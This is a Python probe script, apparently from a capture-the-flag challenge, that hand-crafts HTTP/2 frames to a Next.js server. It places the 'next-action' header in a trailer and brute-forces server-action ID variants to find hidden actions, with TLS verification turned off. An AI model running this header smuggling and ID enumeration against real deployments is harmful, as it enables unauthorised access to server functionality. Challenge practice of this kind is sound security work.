#!/usr/bin/env python3
"""
probe41: try action ID variants (42-byte vs 40-byte) + look for second action.
"""
import socket
import ssl
import struct
import time
import re
import json
import hashlib
from hpack import Encoder, Decoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443

with open("/tmp/funi.actionid") as f:
    ACTION_ID = f.read().strip()
print(f"# main action_id = {ACTION_ID} ({len(ACTION_ID)} chars)")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
    return sock


def call_action(body_bytes, action_id, content_type="text/plain;charset=UTF-8"):
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p41"),
    ]
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", action_id)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    sock.settimeout(15)
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    sock.close()

    body = b""
    pos = 0
    dec = Decoder()
    status = None
    while pos < len(buf):
        if len(buf) - pos < 9:
            break
        length = int.from_bytes(buf[pos:pos+3], "big")
        ftype = buf[pos+3]
        flags = buf[pos+4]
        sid_ = int.from_bytes(buf[pos+5:pos+9], "big") & 0x7fffffff
        payload = buf[pos+9:pos+9+length]
        pos += 9 + length
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, body


def extract_row1(body):
    text = body.decode("utf-8", "replace")
    m = re.search(r'^1:(\{.*?\})$', text, re.MULTILINE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return m.group(1)
    return None


VARIANTS = [
    ("full", ACTION_ID),                    # 42 chars (current working)
    ("first40", ACTION_ID[:40]),            # 40 chars from front
    ("last40", ACTION_ID[-40:]),            # 40 chars from end
    ("strip00", ACTION_ID.replace("00", "", 1)),  # in case 00 is padding
    ("uppercase", ACTION_ID.upper()),       # case sensitive?
    ("old_id", "40c6382106bb726484f31b3ebc21b7476819a1cccf"),  # old action_id from probes
    ("oldid_first40", "40c6382106bb726484f31b3ebc21b7476819a1cc"),
    # Empty/invalid
    ("empty", ""),
    ("zeros40", "0" * 40),
    ("zeros42", "0" * 42),
    # Bumped variants — try +1 / -1
    ("bumped_4083", "4083c44f4a6a9cc400f0e6b45ed1c06c10f100aad2"),
    ("bumped_4081", "4081c44f4a6a9cc400f0e6b45ed1c06c10f100aad2"),
]

print(f"\n{'variant':<20} status sha row1")
for name, aid in VARIANTS:
    if not aid:
        # Skip, h2 trailer needs non-empty
        # try sending empty trailer
        pass
    try:
        st, body = call_action(b'["$K1"]', aid)
    except Exception as e:
        print(f"  {name:<20} ERR={e}")
        continue
    sha = hashlib.sha256(body).hexdigest()[:12]
    row1 = extract_row1(body)
    err = row1.get("error") if isinstance(row1, dict) else None
    msg = (row1.get("message", "") if isinstance(row1, dict) else "")[:50] if row1 else ""
    print(f"  {name:<20} st={st} sha={sha} err={err} msg={msg!r}")
    if row1 and isinstance(row1, dict) and err and err != "recovery-offline":
        print(f"    !!! UNUSUAL row1: {row1}")
    if row1 and isinstance(row1, dict) and row1.get("ok"):
        print(f"    !!!!! ok=true: {row1}")
    time.sleep(0.4)

# Also try guessing other action IDs by enumerating last 2 chars
print("\n# Enum last 2 chars")
prefix = ACTION_ID[:-2]
for byte in range(0x00, 0x100, 0x10):
    aid = prefix + f"{byte:02x}"
    if aid == ACTION_ID:
        continue
    try:
        st, body = call_action(b'["$K1"]', aid)
    except Exception as e:
        print(f"  {aid[-4:]}: ERR={e}")
        continue
    sha = hashlib.sha256(body).hexdigest()[:12]
    row1 = extract_row1(body)
    err = row1.get("error") if isinstance(row1, dict) else None
    if st != 500 or row1:
        msg = (row1.get("message", "") if isinstance(row1, dict) else "")[:50] if row1 else ""
        print(f"  ...{aid[-4:]}: st={st} sha={sha} err={err} msg={msg!r}")
    time.sleep(0.3)

print("\n# done.")
